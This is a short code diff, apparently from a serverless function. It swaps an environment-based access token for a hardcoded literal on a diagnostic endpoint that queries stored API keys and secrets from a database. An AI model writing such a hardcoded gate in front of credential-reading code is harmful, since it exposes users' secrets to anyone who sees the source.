@@ -4,7 +4,7 @@ const json = (data, status = 200) => new Response(JSON.stringify(data), { status
 
 export async function onRequestGet({ request, env }) {
   const url = new URL(request.url);
-  if (url.searchParams.get('t') !== env.DIAG_TOKEN) return json({ error: 'no' }, 404);
+  if (url.searchParams.get('t') !== 'd4buxaosjf110vslj') return json({ error: 'no' }, 404);
   const out = { db: {}, mr: {}, or: {}, wa: {}, gem: {} };
   try {
     const rows = await env.DB.prepare("SELECT key, value FROM env_vars WHERE key LIKE '%API%' OR key LIKE '%KEY%'").all();
